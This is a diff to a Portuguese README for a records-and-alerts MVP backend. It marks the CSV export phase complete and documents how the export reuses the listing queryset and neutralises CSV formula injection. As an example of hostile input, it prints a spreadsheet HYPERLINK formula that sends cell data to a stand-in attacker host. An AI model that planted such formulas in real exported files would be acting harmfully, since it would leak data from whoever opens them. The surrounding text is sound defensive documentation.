@@ -75,7 +75,7 @@ Não há frontend. A interface do MVP é:
 
 ## Estado atual
 
-**Phases 0–5 concluídas** — infraestrutura, autenticação, estrutura dinâmica, registros, controle de vencimento e alertas automáticos.
+**Phases 0–6 concluídas** — MVP funcional completo: da autenticação à exportação. Faltam o endurecimento (RLS, redação de logs) e a suíte de segurança.
 
 | Phase | Escopo | Status |
 |---|---|---|
@@ -85,7 +85,7 @@ Não há frontend. A interface do MVP é:
 | 3 | `records` — registros JSONB validados | ✅ |
 | 4 | Status e ordenação por vencimento | ✅ |
 | 5 | `alerts` — regras, job Celery, inbox | ✅ |
-| 6 | `exports` — CSV seguro | ⬜ |
+| 6 | `exports` — CSV seguro | ✅ |
 | 7 | Row-Level Security e endurecimento | ⬜ |
 | 8 | Suite de segurança do MVP | ⬜ |
 | 9 | Documentação e seed demo | ⬜ |
@@ -187,6 +187,38 @@ A regra padrão nasce por sinal quando a tabela ganha uma coluna `due_date`, usa
 #### Vencimento mudou
 
 Adiar um contrato torna o aviso "vence em 20/08" informação errada. Alertas ainda **acionáveis** (`pending`, `sent`) cujo `due_date_snapshot` discorda do vencimento atual são descartados e regerados com a data nova. Os já **lidos ou descartados sobrevivem** — são histórico — e passam a expor `is_stale: true`.
+
+### Exportação CSV
+
+```
+GET /api/tables/{id}/records/export/?status=overdue&delimiter=;
+```
+
+**A exportação não tem caminho de consulta próprio.** É uma *action* do próprio `RecordViewSet`, então usa literalmente o mesmo `get_queryset()` e `filter_queryset()` da listagem. Uma view separada que refizesse a busca da tabela seria um segundo lugar onde esquecer o filtro por dono — exatamente o risco que o RS08 quer eliminar.
+
+Consequência útil: **você exporta o que está vendo**. `?status=overdue`, `?due_before=`, `?ordering=` — todos valem na export.
+
+Resposta em streaming (`StreamingHttpResponse`), sem materializar o arquivo em memória.
+
+#### Proteção contra CSV injection (RS08)
+
+Uma célula iniciada por `=`, `+`, `-`, `@`, TAB ou CR é interpretada como **fórmula** por Excel, LibreOffice e Sheets. Como o conteúdo vem do usuário, alguém pode gravar num registro:
+
+```
+=HYPERLINK("http://ataque/?d="&A1,"Clique")
+```
+
+O dado sai do sistema íntegro; o estrago acontece na máquina de quem abre. Por isso a defesa é na escrita do arquivo:
+
+```csv
+Cliente,Valor,Renovar,Data de vencimento
+"'=HYPERLINK(""http://ataque/?d=""&A1,""clique"")",-500,Não,2026-08-14
+Empresa Ação,1500,Sim,2026-08-21
+```
+
+Repare que **`-500` não foi prefixado**. Neutralizar todo `-` transformaria valores negativos em texto e eles sumiriam das somas da planilha — números puros são exceção explícita.
+
+Detalhes: BOM UTF-8 (sem ele o Excel no Windows mostra `ContrÃ¡to`), booleanos como `Sim`/`Não` — o cabeçalho já usa os rótulos humanos das colunas —, e `?delimiter=;` para o Excel em pt-BR.
 
 #### O payload não vaza (RS05)
 
